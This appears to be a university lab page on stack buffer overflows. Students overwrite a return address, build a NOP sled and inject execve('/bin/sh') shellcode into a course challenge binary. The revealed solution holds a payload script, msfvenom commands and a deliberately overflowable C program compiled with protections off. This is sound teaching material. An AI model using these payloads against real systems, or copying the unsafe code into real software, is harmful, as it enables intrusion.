---
title: "Lab 2: Controling Execution & Shellcode"
weight: 2
draft: false
---

## Overview

{{< callout emoji="💡" >}}

In this lab you will learn to craft an input that hijacks the control flow of a
program.

**Goals:**

- Understand stack frames and return addresses
- Practice using `gdb`

**Estimated Time:** `45 Minutes`

{{< /callout >}}

## Instructions

{{% steps %}}

### Analyze Program Security Restrictions

Using a common tool called `checksec` you can see information about what
security properties this challenge program was compiled with. The only version
on the class VM is the one bundled with the `gef` plugin for `gdb`. Run the
following command:

```sh {filename=Shell}
gdb -q -ex 'checksec' -ex 'q' ./challenge.bin
```

{{< question >}}

Explain what each of the security checks mean. Does the stack region for this
program have execute permissions enabled?

{{< /question >}}

### Build a NOP sled

Append to your buffer a large number of `nop` (no operation) instructions.
Google, to figure out what to actually put as the bytes for your buffer. Change
the return address from the secret_function address to a stack address pointing
into your `nop` instructions. Verify this by stepping through the code with gdb.

This technique is not particularly necessary for now because this program has a
lot of security features turned off, but it can be very helpful for debugging!

#### Write Your Shellcode

The term "shellcode" comes from that fact that people exploiting buffer
overflows wanted to spawn a shell. This can be done with a single syscall
(`execve`) which will replace the current program with the program specified by
the first argument. You will recreate the traditional shellcode payload by
writing some x86_64 assembly code that spawns `/bin/sh`.

#### Syscall Info

First things first though, you need to know how to execute a syscall in
assembly. This is normally done with the `syscall` instruction. This will
execute a certain syscall based on which number is in `RAX`. Here are some
helpful resources:

- [Chromium Wiki Syscall Table](https://www.chromium.org/chromium-os/developer-library/reference/linux-constants/syscalls/)
- [syscall.sh](https://x64.syscall.sh/)

{{< question >}}

What number must be in `RAX` for the `execve` syscall? What registers are used
for the arguments?

{{< /question >}}

#### Shellcode Tester

Use the following code to write and test your shellcode:

{{< downloadbutton file="shellcode_tester.zip" text="shellcode_tester.zip" >}}

This code is based off of
[this blog post](https://www.secureideas.com/blog/2021/09/linux-x86-assembly-how-to-test-custom-shellcode-using-a-c-payload-tester.html)
and the original source can be found
[on github](https://github.com/ProfessionallyEvil/x86_asm/tree/main/utils). To
use it, write some assembly instructions in the `shellcode.s` file and then run
`make`. This will compile your shellcode for you and insert it into the binary.
Then you can debug the program with `gdb` to step through your shellcode.

```sh {filename=Shell}
# After making edits to shellcode.s
> make
> x64_shellcode_tester
```

{{< question >}}

Include a screenshot of your working shellcode.

{{< /question >}}

### Run Your Shellcode!

The last thing to do is try your shellcode on the real challenge binary! If you
use the tester above, then this will generate a `shelcode.bin` file with the
bytes of your shellcode. To convert it to the python byte-string form, you can
use this command:

```sh {filename=Shell}
hexdump -v -e '"x" 1/1 "%02x" ""' shellcode.bin | sed 's/x/\\\\x/g'
# \x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41...
```

> [!NOTE]
>
> The above is a really hacky thing I found online. If anyone has a cleaner
> suggestion let us know!

{{% /steps %}}

{{% details title="Click to reveal.." closed="true" %}}

#### Check program security

![](./checksec.png "")

#### NOP Example

```python
import sys
import struct

# Data
nops = b"\x90" * 104
retaddr = struct.pack("<Q", 0x4141414141414141)

# Write to output
sys.stdout.buffer.write(nops + retaddr)
```

![](./gef_break_return.png "")

![](./gef_show_nops.png "")

```diff
6c6
< retaddr = struct.pack("<Q", 0x4141414141414141)
---
> retaddr = struct.pack("<Q", 0x00007FFFFFFFE070)
```

#### Shellcode Samples

You can find lots of versions online, but learning how to do it yourself is
absolutely worthwhile!

- [Shell Storm](https://shell-storm.org/shellcode/index.html)
  - [Linux/x86-64 - `execve("/bin/bash",{NULL},{NULL})` - 24 bytes by Joao](https://shell-storm.org/shellcode/files/shellcode-909.html)

```sh {filename=Shell}
# https://docs.metasploit.com/docs/using-metasploit/getting-started/nightly-installers.html
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && \
  chmod 755 msfinstall && \
  ./msfinstall

# Use msfvenom to generate shellcode
msfvenom --payload linux/x64/exec -f python
# Create database... etc...
# ...
```

![](./generated_working_shellcode.png "")

#### Troubleshooting Shellcode

You have to be careful with your shellcode on x86_64 based systems because you
may get error with alignment issues. Basically, when you make a function call
(even a `syscall`) the stack needs to be aligned or the processor will give you
a memory fault. If you run into this issue, try adjusting your `NOP` sled
padding and try again.

- https://security.stackexchange.com/questions/33293/can-exploit-vulnerability-if-program-started-with-gdb-but-segfaults-if-started?noredirect=1&lq=1

I also ran into some issues where it worked in `gdb` and not for the real
program. The consensus online seems to be that this is mainly due to `gdb`
adding environment variables that affect stack offsets.

- https://reverseengineering.stackexchange.com/a/16680
- https://www.reddit.com/r/ExploitDev/comments/1ngqrdi/buffer_overflow_shellcode_fail_outside_gdb/
- https://stackoverflow.com/questions/32917033/how-to-get-environment-of-a-program-while-debugging-it-in-gdb
- https://security.stackexchange.com/questions/152964/exploit-does-not-work-outside-gdb
- https://security.stackexchange.com/questions/223350/64bit-buffer-overflow-fails-with-sigill-cannot-understand-the-reason

You can verify that the stack offsets are the same with this test program which
is also exploitable:

```C {filename=main.c}
/* Based on an idea from:  */
#include <stdint.h>
#include <stdio.h>

void vulnerable_function() {
  uint8_t buffer[0x100];

  printf("Input: ");
  fgets((char *)&buffer, 0x200, stdin);

  register size_t stack_pointer asm("rsp");
  printf("\n$Stack Pointer: %#016zx\n", stack_pointer);
}

int main(int argc, char *argv[]) {
  vulnerable_function();
  return 0;
}
```

Compile with:

```sh {filename=Shell}
# Ignore the warning about the buffer overflow. That's the
# whole point lol.
gcc main.c -o test -fno-stack-protector -z execstack
```

Finally, once you get your shellcode executing it might just exit immediately
and not print anything. This is because the program detects when you pipe input
from a file to a program using the pipe (`|`) operator or input redirection
(`<`) rather than connecting to your terminal. You can get around this by
tricking the shell into keeping the input connection open with another `cat`
command ([Source](https://stackoverflow.com/a/8509410)).

```sh {filename=Fish}
{python3 solution.py; cat } | ./challenge.bin
```

```sh {filename=Bash}
(python3 solution.py; cat ) | ./challenge.bin
```

{{% /details %}}

## Submission

{{< callout emoji="📝" >}}

Submit a markdown file with any code you wrote and the answers to questions to
[ELMS](https://umd.instructure.com/courses/1390353/assignments).

{{< /callout >}}
